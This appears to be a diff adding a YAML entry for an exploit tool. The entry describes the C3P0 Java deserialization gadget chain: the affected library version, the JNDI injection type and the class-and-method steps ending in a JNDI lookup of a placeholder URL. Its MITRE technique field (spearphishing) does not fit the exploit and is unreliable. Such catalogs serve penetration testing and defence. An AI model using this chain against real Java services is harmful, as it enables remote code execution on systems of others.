@@ -1,0 +1,24 @@
+name: "C3P0"
+category: "c3p0"
+description: "C3P0 gadget chain using PoolBackedDataSource and ConnectionPoolDataSource"
+jdk_version: "all"
+dependencies:
+  - name: "c3p0"
+    version: "0.9.5.2"
+exploit_type: "jndi_injection"
+payload_type: "jndi"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"
+    method_name: "readObject"
+    parameters: []
+  - class_name: "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
+    method_name: "getConnection"
+    parameters: []
+  - class_name: "javax.naming.InitialContext"
+    method_name: "lookup"
+    parameters:
+      - "{jndi_url}"
